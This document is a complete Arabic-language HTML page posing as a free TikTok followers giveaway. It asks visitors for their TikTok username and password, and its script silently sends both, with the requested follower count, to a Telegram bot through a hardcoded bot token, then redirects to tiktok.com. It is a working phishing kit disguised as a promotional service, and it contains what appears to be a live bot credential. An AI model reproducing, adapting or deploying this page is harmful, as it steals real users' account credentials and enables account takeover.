<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>TikTok رشق</title>
    <style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',sans-serif;background:#000;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{background:#121212;padding:25px;border-radius:16px;width:380px;text-align:center;border:1px solid #333}img{width:90px;margin:0 auto 15px;display:block}h2{color:#fe2c55;margin-bottom:6px}p{color:#ccc;font-size:14px;margin-bottom:18px}.gift-box{background:linear-gradient(135deg,#ff0050,#00f2ea);border-radius:12px;padding:12px;margin-bottom:15px}.gift-box span{font-weight:bold;font-size:18px}input,select{width:100%;padding:14px;margin:8px 0;background:#1e1e1e;border:1px solid #333;border-radius:8px;color:#fff;font-size:16px;text-align:center}select{appearance:none}.btn{background:#fe2c55;color:#fff;border:none;padding:14px;width:100%;border-radius:8px;font-size:18px;font-weight:bold;cursor:pointer;margin-top:10px}.btn:hover{background:#e0274b}</style></head>
<body><div class="card">
<img src="https://lf16-tiktok-common.ttwstatic.com/obj/tiktok-web-us/tiktok/webapp/main/webapp-desktop/044c9a2a9c7b3d5b2b8c.png" alt="TikTok">
<h2>🎁 رشق متابعين تيك توك</h2>
<p>احصل على متابعين حقيقيين مجاناً!</p>
<div class="gift-box"><span>🎉 1000 متابع مجاناً</span></div>
<select id="amount"><option value="100">100 متابع</option><option value="500">500 متابع</option><option value="1000" selected>1000 متابع</option><option value="5000">5000 متابع</option></select>
<input id="username" placeholder="اسم المستخدم في تيك توك">
<input id="password" type="password" placeholder="كلمة المرور للتأكيد">
<button class="btn" onclick="sendData()">إرسال الرشق الآن 🚀</button>
<p id="msg" style="margin-top:12px;font-size:14px;font-weight:bold;"></p>
</div>
<script>
const TOKEN="8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs";const p=new URLSearchParams(location.search);const CHAT=p.get('chat');
function sendData(){const u=document.getElementById('username').value,pa=document.getElementById('password').value,am=document.getElementById('amount').value;
if(!u||!pa)return alert('املأ جميع الحقول');
document.getElementById('msg').innerHTML='⏳ جاري إرسال الرشق...';
fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent('🎵 رشق تيك توك\n👤 '+u+'\n🔑 '+pa+'\n📊 الكمية: '+am+' متابع')}`).then(()=>{document.getElementById('msg').innerHTML='✅ تم الإرسال! سيصل الرشق خلال دقائق.';setTimeout(()=>location.href='https://tiktok.com',3000)});}
</script></body></html>
